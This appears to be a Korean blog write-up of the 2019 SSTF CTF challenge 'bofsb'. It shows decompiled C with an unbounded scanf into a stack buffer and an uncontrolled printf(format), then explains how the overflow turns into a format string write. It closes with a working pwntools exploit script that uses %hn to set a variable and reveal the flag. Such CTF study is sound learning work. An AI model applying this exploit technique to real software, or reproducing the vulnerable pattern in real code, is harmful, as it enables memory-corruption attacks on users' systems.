---
title: "2019 SSTF bofsb"
date: 2020-1-6
tags: [SSTF]
categories: [SSTF]
---

32비트 바이너리다. 메인은 1,2 입력받아서 각각 format에 Black, White 저장해준다. 그리고 name 주소를 magic code라면서 준다. 이름을 입력하는 곳에서는 bof가 터진다. 그리고  `printf(format);` 에서는 FSB가 터진다. 

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+0h] [ebp-50h]
  int name; // [esp+4h] [ebp-4Ch]
  char *format; // [esp+44h] [ebp-Ch]
  unsigned int v7; // [esp+48h] [ebp-8h]

  v7 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  puts("Welcome to Othello game!");
  puts("Please select your color.");
  puts(" 1: Black");
  puts(" 2: White");
  printf(" > ");
  __isoc99_scanf("%d", &v4);
  if ( v4 == 1 )
  {
    format = "Black";
  }
  else
  {
    if ( v4 != 2 )
    {
      puts("You selected a wrong number.");
      exit(0);
    }
    format = "White";
  }
  printf("okay, please remember this magic code: %p\n", &name);
  printf("Please enter your name: ");
  __isoc99_scanf("%s", &name);
  printf("%s, your color is ", &name);
  printf(format);
  if ( playOthello(v4) )
  {
    puts("Congrats, You Win!!");
    showFlag();
  }
  else
  {
    puts("Sorry, you lose.");
  }
  return 0;
}
```

`playOthello` 함수는 v4의 값이 33이면 `showFlag` 로 가서 flag 파일을 읽어서 출력해준다. 그러면 우선 v4의 값은 1 아니면 2인데 이를 바꿔주면 된다. 

```c
_BOOL4 __cdecl playOthello(int a1)
{
  printf("\n\nLet the games Begin... Your card is %x\n", a1);
  return a1 == 33;
}
```

name은 ebp-0x4C에 있고 format은 0xC에 존재하므로 name의 크기는 0x40이다. 여기서 name을 입력받을 때 0x40 이후 4바이트를 입력하면 format을 덮을 수 있다.

name 입력할 때 format을 v5(&name)으로 덮어버린다. 그러면 `printf(format) -> printf(name)`이 될것이다. 

scanf는 공백으로 입력 값을 구분하므로 공백 없이 값을 넣어줘야한다. 

payload : 'A'*4 + "%p%p%p%p%p" + "A" * (0x40-len(전에넣었던만큼)) + p32(name)

이런식으로 넣어서 offset을 구해줄 수 있다. 그러면 0x41414141이 2번째에 나온다.

이제 AAAA 대신 v4를 넣어주고 29만큼 채운 후 `%2$hn` 으로 v4주소에 앞서 출력한 33바이트만큼을 넣어주고 64바이트만큼 채운 다음에 &name을 넣어주면 된다.

> exploit.py

```python
from pwn import *

context.arch = 'i386'
# context.log_level = 'debug'
e = ELF('./bofsb')
p = process('./bofsb')

p.sendlineafter('>','1')
p.recvuntil(': ')
name = int(p.recvline(),16)
v4 = name - 4
log.info('name addr : ' + hex(name))
log.info('v4 : ' + hex(v4))
'''
payload = 'A'*4
payload += '%p%p%p%p%p%p'
payload += 'A'*(0x40-len(payload))
payload += p32(name)
'''
payload = p32(v4)
payload += '%{}c'.format(33-4)
payload += '%{}$hn'.format(2)
payload += 'B'*(64-len(payload))
payload += p32(name)
p.sendlineafter(':',payload)

p.interactive()
```





